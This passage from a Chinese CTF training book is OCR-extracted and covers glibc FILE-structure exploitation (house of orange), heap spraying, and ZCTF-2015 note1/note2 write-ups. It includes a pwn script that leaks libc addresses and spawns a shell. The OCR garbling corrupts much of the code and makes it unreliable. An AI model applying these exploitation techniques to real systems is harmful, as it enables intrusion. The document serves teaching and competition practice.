p64（10_chain)+\
p32（_fileno)
struct=struct.ljust（0x88,"x00")
struct +=p64（lock)
struct = struct.ljust(0xd8,"x00")
returnstruct
fake_vtable_addr=io_str_overflow_ptr_addr-2*8
---
## Page 505
CTF特训营：技术详解、解题方法与
13.3.7 house of orange
505/1144
（）]
if（1（*file_struct &0x8000））
break:
EL_23:
if（*（file_struct +0xCo）（=0）
if （*（file_struct + 0x28)_fleno=1使之成为stdout，同时还需要满足一定的条件，进而可以
通过write将数据打印出来。具体代码如下：
l0_ssize_t
IO_new_file_write (IO_FILE*f,const void*data,_IO_ssize_t n）
u=opozissoi
while (to_do>0)
---
## Page 508
CTF特训营：技术详解、解题方法与
508/1144
IO_ssize_tcount=（builtin_expect（f->_flags2
&_IO_FLAGS2_NOTCANCEL,0)
?write_nocancel(f->_fileno,data,to_do)
：write（f->_fileno,data,to_do);//将数据data写入了f->
fileno中
if（count_flags|=_IO_ERR_SEEN;
break;
to_do-=count;
data=（void*)（（char*) data+count);
n-=to_do;
if (f->_offset >= 0)
f->_offset +=n;
retumn;
构造条件具体如下。
·_fileno为stdout。
_flag&=~_IO_NO_WRITES。
_FLAG|=_IO_CURRENTLY_PUTTING
write_base&write_ptr为打印目标地址。
read_end为write_base。
b）对于固定地址任意地址写，_O_new_file_xsputn会将data中
的数据写入f->IO_write_ptr，示例代码如下：
---
## Page 509
CTF特训营：技术详解、解题方法与
13.3.7 house of orange
509/1144
else if (f->_1O_write_end>f->_IO_write_ptr)
count=f->_IO_write_end-f->_IO_write_ptr;/*Space available.*/
/*Then fill the buffer. */
if (count >0)
if（count>to_do)
count=to_do;
f->_10_write_ptr=
mempcpy（f->IOwrite_ptr,s,count);
s+= count;
to_do-=count;
{
利用条件如下：write_end-write_ptr为要写入的数据长度。
2）fread实现任意地址读写。
对于任意地址写_O_file_read，我们可以构造fp->fileno=0即
stdin，从而将输入的值写入buf。示例代码如下：
IO_ssize_t
_IO_file_read (IO_FILE *fp,void *buf,_IO_ssize_t size)
return(_builtin_expect (fp->_flags2&_IO_FLAGS2_NOTCANCEL,0)
?readnocancel（fp->fileno,buf,size)
：read（fp->_fileno,buf,size));
利用条件具体如下。
flag&=~_IO_NO_READS
---
## Page 510
CTF特训营：技术详解、解题方法与
13.3.7 house of orange
510/1144
read_ptr&read_end为NULL。
-buf_base为目标地址，buf_end为buf_base+[读入数据长度+1]。
3)stdout。
修改_lO_read_base和_lO_read_end，或者修改_IO_write_base
和_IO_write_end时，会分别往前修改base或者往后修改end，使其缓
冲区间包含libc或者其他内容，可以以脏数据的形式进行信息的泄露
具体真题可参考：HITCON2018babytache。
更多往年的经典例题：
·WCTF2017wannaheap。
TokyoWesternCTF2017Parrot
WHCTF2017stackoverflow
Hacklu2018heaphell2(glibc2.28)。
---
## Page 511
CTF特训营：技术详解、解题方法与
13.3.8堆喷射
511/1144
13.3.8堆喷射
堆喷射（HeapSpray）主要是指，在堆块中布置好大量重复性的
数据，便于目的地址索引到堆上的数据。堆喷射相对于栈喷射来说较
为麻烦，CTF赛题中很少出现堆喷射型题目，真实漏洞中利用较多
在此仅做简单介绍。
通常，简单的堆喷射可以类比于栈喷射，只是在CTF题中，堆喷
射中有专门针对随机申请隔离堆的保护机制。堆喷射可使随机申请的
堆大小与所使用的堆大小相同，如果存在UAF漏洞，则能够产生利用。
堆喷射实例请参考game（2017-hctf-final），在反序列化漏洞利用
时，需要通过堆喷射来实现利用的稳定性
堆喷射相关的CTF赛题出现概率较小，在pwnable.kr网站上有一
道关于lokihard对浏览器利用的题，对于理解堆喷射有较大的帮助
读者可以自行练习扩展。
---
## Page 512
CTF特训营：技术详解、解题方法与
13.3.9更多堆利用技巧
512/1144
13.3.9更多堆利用技巧
这里主要介绍下堆地址碰撞。对于x86程序来说，堆地址空间通
常是有限的，虽然提供的长度有32位，但是一般来说，堆会按页对
齐，所以后12位是不变的。另外，堆的大致空间范围也有限，所以
通常只有十几位在变。在本地，如果无法泄露出堆地址，则可以将通
过调试时得到的堆地址视为已知的堆地址来进行利用，然后通过多次
循环进行碰撞，如果程序交互时间较短的话，那么这种碰撞方法将会
很有效。
其他技巧可以具体参考：https://lgithub.com/shellphish/how2heap
---
## Page 513
CTF特训营：技术详解、解题方法与
13.4真题解析
513/1144
13.4真题解析
1.{ZCTF-2015)note1(PWN200)
这道题比较简单，是一个菜单式的交互程序，分析程序的结构体，
可以得到图13-22所示的结构体。
00o0e0o0 struct_note_info struc ;（sizeof=θx170)
00000000pre
dq？
；offset
00000008 next
dq？
；offset
00000010 title
db 64 dup(？)
00000050 type
db 32 dup(？)
00000070 conteht
db 256 dup(？)
@eooe17θ struct_note_info ends
图13-22
2note1结构体
由图13-22所示可以得知见，content的长度为256字节，而在edit
的时候，能够读入512字节，从而发生缓冲区覆盖，如图13-23所示。
redu_uutt_4uusyv(uutr,o4,1u);
for（i=note_head_6θ20Bθ;i&& strcmp(buff，i->title）;i=i->next)
；
if （i）
puts(Enter the new content:");
read_buff_40089D(i->content,512,10);
puts(Modify success");
else
puts(Not find the note);
---
## Page 514
CTF特训营：技术详解、解题方法与
13.4真题解析
514/1144
图13-23note1缓冲区溢出关键点代码
结构体中有指针，泄露和利用都比较容易，利用代码如下：
frompwn import*
#target="/note1"
target =(115.28.27.103", 9001)
def get_io(target):
r_m=COLORED（RAW,"green")
W_m=COLORED（RAW,“blue”)
io = zio(target,timeout = 9999, print_read =r_m, print_write = w_m)
return io
def new_note(io,title_t,type_t,content_t)）:
io.read_until("option--->>in")
io.writeline("1")
io.read until("title:\n")
io.writeline(title_t)
io.read_until("type:ln")
jo.writeline(type_t)
io.read_until("content:\n")
io.writeline(content_t)
def show_note(io):
io.readuntil("option--->>in")
io.writeline("2")
def edit_note(io,title_t,content_t）:
io.read_until("option--->>\n")
io.writeline("3")
io.read_until("title:In")
io.writeline（title_t)
io.read_until("content:\n")
io.writeline(content_t)
defpwn(io):
new_note(io,'aaa','aaa','aaa)
new_note(io，bbb”,bbb，,bbb)
new_note（io,'ccc'，'ccc,'ccc)
show_note(io)
atoi_got=0x0000000000602068-0x80
+（16）9+（0x0）9+（0x0）9+（0x0）9+9=10
io.gdb hint()
---
## Page 515
CTF特训营：技术详解、解题方法与
13.4真题解析
515/1144
edit_note(io,'aaa',content)
show_note(io)
io.read_until("title=,type=，content=")
data =io.read_until(n")[:-1]
print [cforcin data]
data=data.ljust（8,x00)
malloc_addr=|64(data)
print“malloc_addr:",hex(malloc_addr)
elf _info =ELF("./libc-2.19.so")
malloc_offset =elf_info.symbols["malloc"]
system_offset= elf_info.symbols[system]
libc base=malloc_addr-malloc_offset
system_addr = libc_base + system_offset
content ="a"*16+164（system_addr)
print“system_addr:",hex(system_addr)
edit note(io,，content)
io.read_until("option--->>\n")
io.writeline("/bin/sh")
io.interact()
io= get_io(target)
pwn(io)
2.ZCTF-2015}note2（PWN400）
这道题也是菜单式的，主要问题在于执行edit的时候，append可
以越界，如图13-24所示。
---
## Page 516
CTF特训营：技术详解、解题方法与
13.4真题解析
516/1144
if（choice==1llchoice==2）
if （choice ==1）
=[]sap
else
strcpy(dest，ptr);
uθ=（char *）malloc（16θuLL）;
u8=uθ;
*（_QWORD*）uθ='oCweNehT'；
:.=（+））
printf(u8);
get_buff_4009BD(u8+15，144LL，10);
filter_400B10(u8+15);
u1=；
u1[size-strlen(dest）+14]=θ;
strncat（dest,u8 +15，θxFFFFFFFFFFFFFFFFLL);
strcpy(ptr，dest);
free(u8);
puts("Edit note success!");
>
图13-24note2堆溢出溢出点关键代码
如果size开始为0，那么size-strlen（dest）+14≤14了，所以最后
执行strmca的时候，可以无限附加并覆盖下一个堆块，由于每个堆块
的大小都可以自己设置，所以这里采用fastbin（堆块大小为
0x20-0x80）的方式。由于可以覆盖后面的堆块，所以可以在name
中伪装为假堆块，然后对其进行释放，这样再次申请的时候，就可以
---
## Page 517
CTF特训营：技术详解、解题方法与
13.4真题解析
517/1144
得到该地址，从而改写全局指针，如图13-25所示。
bS5:0000000000602009
align20h
bss:00000000006020E0 nane_6020E0
db 40h dup(？)
.bss:0000000000602120 ;char *ptr_manage_602120[]
bss:0000000000602120 ptr_nanage_602120dq?
.bS5 : 0000000000602120
.bs5:0000000000602128
align 20h
.b55:0000000000602140;
int64 size_manage_602140[]
bss:0000000000602140 size_manage_602140 dq ？
bs5:0000000000602140
图13-25note2全局变量指针
最终利用代码如下：
from zio import *